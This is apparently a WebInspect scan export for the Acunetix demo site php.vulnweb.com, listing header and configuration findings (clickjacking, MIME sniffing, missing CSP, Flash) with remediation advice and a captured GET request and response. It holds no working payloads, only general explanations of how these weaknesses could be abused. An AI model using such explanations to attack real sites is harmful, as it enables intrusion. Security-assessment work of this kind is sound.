<?xml version="1.0" encoding="utf-8"?><Sessions version="2.0" appVersion="20.1"><Session requestId="DD4E05C8521F7A29194D4BE7487B1CA5"><URL>http://php.vulnweb.com:80/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="1b9f96a7-3e94-4b61-a561-3711f2151985"><CheckTypeID>Best Practices</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>5546</VulnerabilityID><Severity>0</Severity><Name>Privacy Policy Not Present</Name><Classifications><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Compliance Failure: Missing Privacy Policy" href="https://vulncat.fortify.com/">Compliance Failure: Missing Privacy Policy</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[<p>A privacy policy was not supplied by the web application within the scope of this audit. Many legislative initiatives require that organizations place a publicly accessible document within their web application that defines their website’s privacy policy.  As a general rule, these privacy policies must detail what information an organization collects, the purpose for collecting it, potential avenues of disclosure, and methods for addressing potential grievances.</p><p>Various laws governing privacy policies include the Gramm-Leach-Bliley Act, Health Insurance Portability and Accountability Act (HIPAA), the California Online Privacy Protection Act of 2003, European Union's Data Protection Directive and others.</p>]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[Most privacy laws are created to protect residents who are users of the website. Hence, organizations from any part of the world must adhere to these laws if they cater to customers residing in these geographical areas. Failing to do so could result in a lawsuit by the corresponding government against the organization.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<p>All of the web pages accessible within the scope of the scan are sampled for textual content that often constitutes a privacy policy statement. A violation is reported upon completion of the web application crawl without a successful match against any of the web pages.</p><p>Note that the privacy policy of your application could be located on another host or within a section of the site that was not configured as part of the scan. To validate, please try to access the privacy policy of your website and check to see if it was part of the scan.</p><br /><drc_privacy />]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Declare a comprehensive privacy policy for the website, and ensure that it is accessible from every page that seeks personal information from users. To verify the fix, rescan the site in order to discover and audit the newly added resources.

<br /><br /><b>Descriptions: </b><br />
Any standard web application privacy policy should include the following components:
<ul><li>A description of the intended purpose for collecting the data.</li><li>A description of the use of the data.</li><li>Methods for limiting the use and disclosure of the information.</li><li>A list of the types of third parties to whom the information might be disclosed.</li><li>Contact information for inquires and complaints.</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<b>California Online Privacy Protection Act</b><br /><a href="http://oag.ca.gov/privacy/COPPA">http://oag.ca.gov/privacy/COPPA</a><br /><br /><b>National Conference of State Legislation</b><br /><a href="http://www.ncsl.org/issues-research/telecom/state-laws-related-to-internet-privacy.aspx">http://www.ncsl.org/issues-research/telecom/state-laws-related-to-internet-privacy.aspx</a><br /><br /><b>Gramm-Leach-Bliley Act</b><br /><a href="http://www.gpo.gov/fdsys/pkg/PLAW-106publ102/pdf/PLAW-106publ102.pdf">http://www.gpo.gov/fdsys/pkg/PLAW-106publ102/pdf/PLAW-106publ102.pdf</a><br /><br /><b>Health Insurance Portability and Accountability Act of 1996</b><br /><a href="https://www.cms.gov/Regulations-and-Guidance/HIPAA-Administrative-Simplification/HIPAAGenInfo/downloads/HIPAALaw.pdf">https://www.cms.gov/Regulations-and-Guidance/HIPAA-Administrative-Simplification/HIPAAGenInfo/downloads/HIPAALaw.pdf</a><br /><br /><b>Health Insurance Portability and Accountability Act of 1996</b><br /><a href="http://ec.europa.eu/justice/policies/privacy/docs/guide/guide-ukingdom_en.pdf">http://ec.europa.eu/justice/policies/privacy/docs/guide/guide-ukingdom_en.pdf</a><br /><br />]]></SectionText></ReportSection></Issue><Issue id="062cbf6e-dc4b-447d-bff3-ab186777f599"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2623" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue><Issue id="b7ffbd67-6b6e-4a0a-bafe-5f7dbec33dff"><CheckTypeID>Info</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest /><VulnerabilityID>10436</VulnerabilityID><Severity>0</Severity><Name>Flash Object Detected</Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="Flash Misconfiguration: Source Code Disclosure" href="https://vulncat.fortify.com/">Flash Misconfiguration: Source Code Disclosure</Classification><Classification kind="CWE" identifier="CWE-540" href="https://cwe.mitre.org/data/definitions/540.html">CWE-540: Information Exposure Through Source Code</Classification></Classifications><DetectionSelection><Location offset="3995" length="201" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A Flash movie or Flash object was found. Flash movies and objects can be decompiled and may contain sensitive information. An attacker could decompile the Flash file and gain access to the confidential information, including any hard-coded passwords and keys, within the Flash file.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
The attacker’s goal in re-creating the original source code may include one or more of the following:
<ul><li>To steal a valuable algorithm for use in his own code </li><li>To understand how a security function works to enable him to bypass it </li><li>To extract confidential information, such as hard-coded passwords and keys</li><li>To enable him to alter the code so that it behaves in a malicious way</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
A primary tool in the arsenal of the attacker who wants to get inside your code is the decompiler. A decompiler takes an executable file and attempts to re-create the original source code. It may be almost impossible to go from machine code to a high-level language. It is, however, easy to recover an assembly language version of the program.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />Flare - Flash Decompiler<br /><a href="http://www.nowrap.de/flare.html">http://www.nowrap.de/flare.html</a>]]></SectionText></ReportSection></Issue><Issue id="6e7470e4-7ed1-4dd5-8ab4-3203d4efa532"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest /><VulnerabilityID>10561</VulnerabilityID><Severity>1</Severity><Name>Vulnerable Flash Engine Allowed</Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="Flash Misconfiguration: Vulnerable Flash Engine" href="https://vulncat.fortify.com/">Flash Misconfiguration: Vulnerable Flash Engine</Classification><Classification kind="CWE" identifier="CWE-937" href="https://cwe.mitre.org/data/definitions/937.html">CWE-937: OWASP Top Ten 2013 Category A9 - Using Components with Known Vulnerabilities</Classification></Classifications><DetectionSelection><Location offset="3995" length="201" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<br />WebInspect has detected the use of Adobe Flash in your application. <br /><br />
Adobe has deprecated Flash with an end-of-life set to the end of 2020.  Flash support has been disabled by default in many browsers, for example Chrome 76 amd Firefox 69. Further, starting in December 2020, Chrome, Firefox and Microsoft Edge will completely eliminate support for Flash.<br /><br />
Adobe Flash has had many vulnerabilities associated with it since its inception.  Of date there are over 1000 CVE’s (Common Vulnerabilities and Exposures) reported against Adobe Flash.  Many of which lead to Remote Code Execution, and Cross-Site Scripting attacks that can compromise user and/or system data and privacy. <br /><br />
Consider updating your application to replace Adobe Flash with safer, alternative technologies that provide similar functionality such as HTML5, WebGL and WebAssembly.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Use of deprecated and vulnerable technology can enable attackers to compromise the target by exploiting known vulnerabilities against the detected server.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Consider replacing the Flash code with safer, alternative technologies such as HTML5, WebGL or WebAssembly.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><a href="https://web.archive.org/web/20171202123704/https://theblog.adobe.com/adobe-flash-update/"><b>Flash and The Future of Interactive Content</b></a><br /><br /><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-53/product_id-6761/Adobe-Flash-Player.html"><b>CVE Details</b></a>]]></SectionText></ReportSection></Issue><Issue id="d04a0d9f-063a-45b1-8c04-f2c49ef55477"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11548</EngineType><AttackHTTPRequest><![CDATA[GET / HTTP/1.1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="ExternalAddedToCrawl";CrawlType="None";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="34";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="5c94cf2f";
X-Request-Memo: ID="49ed71e6";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11294</VulnerabilityID><Severity>2</Severity><Name>Missing Cross-Frame Scripting Protection</Name><Classifications><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Cross-Frame Scripting" href="https://vulncat.fortify.com/">Cross-Frame Scripting</Classification><Classification kind="CWE" identifier="CWE-1021" href="https://cwe.mitre.org/data/definitions/1021.html">CWE-1021: Improper Restriction of Rendered UI Layers or Frames</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[<br />A Cross-Frame Scripting (XFS) vulnerability can allow an attacker to load the vulnerable application inside an HTML iframe tag on a malicious page. The attacker could use this weakness to devise a Clickjacking attack to conduct phishing, frame sniffing, social engineering or Cross-Site Request Forgery attacks.
<br /><br /><b>Clickjacking</b><br />
The goal of a Clickjacking attack is to deceive the victim (user) into interacting with UI elements of the attacker’s choice on the target web site without their knowledge and then executing privileged functionality on the victim’s behalf. To achieve this goal, the attacker must exploit the XFS vulnerability to load the attack target inside an iframe tag, hide it using Cascading Style Sheets (CSS) and overlay the phishing content on the malicious page. By placing the UI elements on the phishing page so they overlap with those on the page targeted in the attack, the attacker can ensure that the victim must interact with the UI elements on the target page not visible to the victim.<br /><br />
WebInspect has detected a response containing one or more forms that accept user input but is missing XFS protection.<br /><i><drc_xfsprotection /></i>]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[A Cross-Frame Scripting weakness could allow an attacker to embed the vulnerable application inside an <font face="courier new">iframe</font>. Exploitation of this weakness could result in:<ol><li>Hijacking of user events such as keystrokes</li><li>Theft of sensitive information</li><li>Execution of privileged functionality through combination with Cross-Site Request Forgery attacks</li></ol>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Create a test page containing an HTML <font face="courier new"> iframe </font> tag whose <font face="courier new">src</font> attribute is set to ~FullURL~. Successful framing of the target page indicates that the application is susceptibile to XFS. <br /><br />Note that WebInspect will report only one instance of this check across each host within the scope of the scan. The other visible pages on the site may, however, be vulnerable to XFS as well and therefore should be protected against it with an appropriate fix.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />The Content Security Policy (CSP) <font face="courier new">frame-ancestors</font> directive obsoletes the <font face="courier new">X-Frame-Options</font> header. Both provide for a policy-based mitigation technique against cross-frame scripting vulnerabilities.  The difference is that while the <font face="courier new">X-Frame-Options</font> technique only checks against the top-level document’s location, the CSP <font face="courier new">frame-ancestors</font> header checks for conformity from all ancestors. <br /><br />
If both CSP <font face="courier new">frame-ancestors</font> and <font face="courier new">X-Frame-Options</font> headers are present and supported, the CSP directive will prevail. WebInspect recommends using both CSP <font face="courier new">frame-ancestors</font> and <font face="courier new">X-Frame-Options</font> headers as CSP is not supported by Internet Explorer and many older versions of other browsers. <br /><br />
In addition, developers must also use client-side frame busting JavaScript as a protection against XFS. This will enable users of older browsers that do not support the <font face="courier new">X-Frame-Options</font> header to also be protected from Clickjacking attacks.<br /><br /><b>X-Frame-Options</b><br />Developers can use this header to instruct the browser about appropriate actions to perform if their site is included inside an <font face="courier new">iframe</font>.<brr />
Developers must set the <font face="courier new">X-Frame-Options</font> header to one of the following permitted values:
<ul><li>DENY<br />
Deny all attempts to frame the page </li><li>SAMEORIGIN<br />
The page can be framed by another page only if it belongs to the same origin as the page being framed</li><li>ALLOW-FROM origin<br />
Developers can specify a list of trusted origins in the origin attribute. Only pages on origin are permitted to load this page inside an <font face="courier new">iframe</font></li></ul><br /><b>Content-Security-Policy: <font face="courier new">frame-ancestors</font></b><br />Developers can use the CSP header with the <font face="courier new">frame-ancestors</font> directive, which replaces the <font face="courier new">X-Frame-Options</font> header, to instruct the browser about appropriate actions to perform if their site is included inside an iframe. Developers can set the frame-ancestors attribute to one of the following permitted values:
<ul><li>
‘none’ <br />Equivalent to “DENY” - deny all attempts to frame the page</li><li>‘self’ <br />Equivalent to “SAMEORIGIN” - the page can be framed by another page only if it belongs to the same origin as the page being framed</li><li> &lt;host-source&gt;<br />Equivalent to “ALLOW-FROM” - developers can specify a list of trusted origins which maybe host name or IP address or URL scheme. Only pages on this list of trusted origin are permitted to load this page inside an iframe</li><li>&lt;scheme-source&gt;<br />Developers can also specify a schema such as http: or https: that can frame the page.</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Frame Busting:</b><br /><a href="http://crypto.stanford.edu/~dabo/pubs/papers/framebust.pdf">Busting Frame Busting: A Study of Clickjacking Vulnerabilities on Popular Sites</a><br /><a href="https://www.owasp.org/images/0/0e/OWASP_AppSec_Research_2010_Busting_Frame_Busting_by_Rydstedt.pdf">OWASP: Busting Frame Busting</a><br /><br /><b>OWASP:</b><br /><a href="https://www.owasp.org/index.php/Clickjacking">Clickjacking</a><br /><br /><b>Content-Security-Policy (CSP)</b><br /><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors#Examples">CSP: frame-ancestors</a><br /><br /><b>Specification:</b><br /><a href="https://w3c.github.io/webappsec-csp/2/">Content Security Policy Level 2</a><br /><a href="http://tools.ietf.org/html/draft-ietf-websec-x-frame-options-01">X-Frame-Options IETF Draft</a><br /><br /><b>Server Configuration:</b><br /><a href="http://support.microsoft.com/kb/2694329">IIS</a><br /><a href="https://developer.mozilla.org/en-US/docs/HTTP/X-Frame-Options">Apache, nginx</a><br /><br /><b>HP 2012 Cyber Security Report</b><br /><a href="http://www.hpenterprisesecurity.com/collateral/whitepaper/HP2012CyberRiskReport_0313.pdf">The X-Frame-Options header - a failure to launch</a>]]></SectionText></ReportSection></Issue><Issue id="f54bf3b2-0ecc-4e85-9465-702b6e352083"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11551</EngineType><AttackHTTPRequest /><VulnerabilityID>11309</VulnerabilityID><Severity>1</Severity><Name>Browser Mime Sniffing is not disabled </Name><Classifications><Classification kind="CWE" identifier="CWE-79" href="http://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</Classification><Classification kind="CWE" identifier="CWE-116" href="http://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</Classification><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Insecure Content-Type" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Insecure Content-Type Setting</Classification></Classifications><DetectionSelection><Location offset="160" length="40" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Almost all browsers are designed to use a mime sniffing technique to guess the content type of the HTTP response instead of adhering to the <font face="courier new">Content-Type</font> specified by the application in specific cases or ignoring the content when no mime type is specified. Inconsistencies introduced by the mime sniffing techniques could allow attackers to conduct Cross-Site Scripting attacks or steal sensitive user data. WebInspect has determined that the application fails to instruct the browser to strictly enforce the <font face="courier-new">Content-Type</font> specification supplied in the response.<br /><br />
Web server misconfiguration can cause an application to send HTTP responses with the missing <font face="courier new">Content-Type</font> header or specify a mime type that does not match up accurately with the response content. When a browser receives such a response, it attempts to programmatically determine the mime type based on the content returned in the response. The mime type derived by the browser, however, might not accurately match the one intended by the application developer. Such inconsistencies have historically allowed attackers to conduct Cross-Site Scripting or data theft using Cascading Style Sheets (CSS) by letting them bypass server-side filters using mime type checking and yet have the malicious payload with misleading mime type specification executed on the client-side due to the browser mime sniffing policies.<br /><br />
Microsoft Internet Explorer (IE) introduced the <font face="courier new">X-Content-Type-Options: nosniff</font> specification that application developers can include in all responses to ensure that mime sniffing does not occur on the client-side. This protection mechanism is limited to Microsoft Internet Explorer versions 9 and above.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[By failing to dictate the suitable browser interpretation of the response content, application developers can expose their users to Cross-Site Scripting or information stealing attacks.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<ul><ol>1. Build a test page that includes a reference to an external JavaScript or CSS resource</ol><ol>2. Configure the server to return the external resource with an incorrect mime type specification</ol><ol>3. Visit the test page using an old version of Microsoft’s Internet Explorer (version  IE 8) browser</ol><ol>4. Interpretation of the external content as JavaScript or CSS by the browser despite the misleading mime type specification indicates a potential for compromise.</ol></ul>]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Configure the web server to always send the <font face="courier new">X-Content-Type-Options: nosniff</font> specification in the response headers. In addition, ensure that following safety precautions are also put in place: 
<ul><ol>1. Verify that the web server configuration will send the accurate mime type information in the <font face="courier new">Content-Type</font> header of each HTTP response</ol><ol>2. Configure the server to send a default <font face="courier new">Content-Type</font> of <font face="courier new">text-plain</font> or <font face="courier-new">application/octet-stream</font> to tackle failure scenarios</ol><ol>3. Ensure that appropriate <font face="courier new"> Character Set </font> is specified in the <font face="courier new"> Content-Type </font>header</ol><ol>4. Configure the server to send <font face="courier new">Content-Disposition: attachment; filename=name; </font>for content without an explicit content type specification.</ol></ul>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft Internet Explorer: </b><br /><a href="http://msdn.microsoft.com/en-us/library/ie/gg622941(v=vs.85).aspx">MIME-Handling Change: X-Content-Type-Options: nosniff</a><br /><a href="http://blogs.msdn.com/b/ie/archive/2010/10/26/mime-handling-changes-in-internet-explorer.aspx">MIME-Handling Changes in Internet Explorer</a><br /><br /><b>OWASP: </b><br /><a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_D:_Encoded_Injection">OWASP Testing Guide Appendix D: Encoded Injection</a><br /><a href="https://www.owasp.org/index.php/List_of_useful_HTTP_headers">List of Useful HTTP Headers</a><br /><br /><b>CSS Data Theft: </b><br /><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0654">CVE-2010-0654</a>]]></SectionText></ReportSection></Issue><Issue id="ccf4e65f-1c47-4b5f-8c74-ce9caa886466"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest /><VulnerabilityID>11603</VulnerabilityID><Severity>1</Severity><Name>Inadequate Cross Site Scripting Header Protection </Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="CWE" identifier="CWE-554" href="https://cwe.mitre.org/data/definitions/554.html">CWE-554: ASP.NET Misconfiguration: Not Using Input Validation Framework</Classification><Classification kind="7PK Category" identifier="HTML5: Cross-Site Scripting Protection" href="https://vulncat.fortify.com/">HTML5: Cross-Site Scripting Protection</Classification><Classification kind="CWE" identifier="CWE-1173" href="https://cwe.mitre.org/data/definitions/1173.html">CWE-1173: Improper Use of Validation Framework</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /><Location offset="179" length="4" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[X-XSS-Protection HTTP response header enables developers and security architects to manage browser protection against reflected cross-site scripting. The mechanism is also known as the XSS Auditor in Chrome and the XSS filter in Internet Explorer.  In modern browsers, the Content-Security-Policy header can provide better protection against XSS and setting X-XSS-Protection might be  redundant. However, this header can reduce the risk of reflected XSS attacks in earlier browsers that do not support CSP.<br /><br />
This header can be set to one of three possible values: <code>0</code>, <code>1</code>, or <code>1</code>; <code>mode=block</code> . A value of <code>0 </code> disables the protection.  A value of <code>1 </code> is the default behaviour in modern browsers that enables the protection in filter or replacement mode. For example, IE replaces JavaScript keywords such as &lt;script&gt; with &lt;scr#pt&gt; to render injected string ineffective.  The value of <code>1</code>; <code>mode=block</code>  instructs browsers to block the response from rendering in the browser.  Reports of multiple exploits that leverage false positives from default behaviour that filters or replaces JavaScript injection string within the response r eturned from server. Therefore, the current recommendation is to set the header in block mode.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[Attackers may leverage zero day  reflective XSS against a site. If the header is not set in block mode, an attacker can use browser-specific filter bypass bugs to succeed in launching a reflected XSS against the site.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Click the response tab for the highlighted request.  The response header X-XSS-Protection is either missing or set to <code>1</code>.<br /><br />
By default, WebInspect flags only one instance of this vulnerability per host because it is typical to set this header at the host level in a server configuration. <br /><br />
Perform the following steps to flag all instances of this issue:<br /><ul><li>Create a new policy with the selection of checks that you want to include in a rescan. We recommend using the Blank or Passive policy as a base. </li><br /><li>Select this check and unselect the check input,  “FlagAtHost”,from standard description  window.</li><br /><li>Save the policy.</li><br /><li>Rescan with this new custom policy.</li><br /></ul>]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Add a configuration setting or a line of code that adds a response header or <meta /> tag to set X-XSS-Protection with the value ‘<code>1</code>; <code>mode=block</code>’]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><a href="https://vulncat.fortify.com/en/weakness">Fortify Taxonomy: Software Security Errors</a><br /><a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-XSS-Protection">OWASP Secure Headers Project</a><br /><a href="https://cwe.mitre.org/data/definitions/554.html">CWE ID 554</a><br /><a href="https://bugs.chromium.org/p/chromium/issues/list?can=1&amp;q=XSS+auditor">Chromium Bugs</a>]]></SectionText></ReportSection></Issue><Issue id="f32ac4ee-1f5e-4296-9b48-22d14732ce6d"><CheckTypeID>Info</CheckTypeID><EngineType>11608</EngineType><AttackHTTPRequest /><VulnerabilityID>11606</VulnerabilityID><Severity>0</Severity><Name>Missing Content-Security-Policy</Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="HTML5: Missing Content Security Policy" href="https://vulncat.fortify.com/">HTML5: Missing Content Security Policy</Classification><Classification kind="CWE" identifier="CWE-1173" href="https://cwe.mitre.org/data/definitions/1173.html">CWE-1173: Improper Use of Validation Framework</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[Content Security Policy (CSP) is an HTTP response security header that developers and security architects can leverage to whitelist domains from which the site is allowed to load resources. This header provides an in-depth security protection from critical vulnerabilities such as cross-site scripting and clickjacking. Additionally, CSP restricts execution of inline JavaScript, dynamic JavaScript code evaluation from strings, and framing of the site from external domains. While CSP is not a replacement for input validation, it can help to significantly reduce the risk of XSS from unknown weaknesses. The CSP frame-ancestors directive is equivalent to X-Frame-Options and restricts the domain that are allowed to frame the site’s content.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[Security  architects and developers can leverage CSP to significantly reduce the risk of XSS and clickjacking attacks. CSP headers can restrict leakage of information to external domains by restricting which domains the site is allowed to load contents from when rendered in browser .]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Access link ~FullURL~ through a proxy and notice the missing CSP header in the response. By default, WebInspect flags only one instance of this vulnerability per host because it is typical to set this header at the host level in a server configuration. <br /><br />
Perform the following steps to flag all instances of this issue:<br /><ul><li>Create a new policy with the selection of checks that you want to include in a rescan. We recommend using the Blank or Passive policy as a base. </li><li>Select this check and uncheck the “FlagAtHost” check input from standard description.</li><li>Save the policy.</li><li>Rescan with this new custom policy.</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Define a CSP policy suitable for your site. The policy can be set either with an HTTP response header or &lt;meta /&gt; tag. <br /><br />
For example:<br /><code>Content-Security-Policy: default-src https://example.net; child-src 'none';</code><br />
Or<br /><code>&lt;meta http-equiv="Content-Security-Policy" content="default-src https://cdn.example.net; child-src 'none'; object-src 'none'"&gt;</code><br /><br />
Content-Security-Policy 2 is the recommended standard. Content-Security-Policy 3 is in draft. The following is a snapshot of modern browser support for the CSP header:<br /><ul><li>Edge: Versions 15-18; supported with a nonce bug. Version 75 and later; fully supported. </li><li>Chrome: Versions 36-38; missing the plugin-types, child-src, frame-ancestors, base-uri, and form-action directives. Version 39; missing the plugin-types, child-src, base-uri, and form-action directives. Version 40 and later; fully supported. </li><li>Firefox: Versions 31-34; missing the plugin-types, child-src, frame-ancestors, base-uri, and form-action directives. Version 35; missing the plugin-types, child-src, frame-ancestors, and form-action directives. Versions 36-44; missing the plugin-types and child-src directives. Version 45 and later; missing the plugin-types directive.</li></ul>
Furthermore, the report-uri directive can be configured to receive reports of attempts to violate the policy. These reports can be used as an early indication of security issues in the site as well as to optimize the policy.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><a href="http://www.w3.org/TR/CSP/">Content Security Policy Level 3</a><br /><a href="https://www.owasp.org/index.php/Content_Security_Policy">OWASP Content Security Policy</a><br /><a href="https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy">MDN web docs</a><br /><a href="https://content-security-policy.com">Content Security Policy (CSP) Quick Reference Guide</a><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="DD4E05C8521F7A29194D4BE7487B1CA5"><![CDATA[GET / HTTP/1.1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="ExternalAddedToCrawl";CrawlType="None";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="34";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="5c94cf2f";
X-Request-Memo: ID="49ed71e6";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:43:47 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4958

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of Acunetix Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
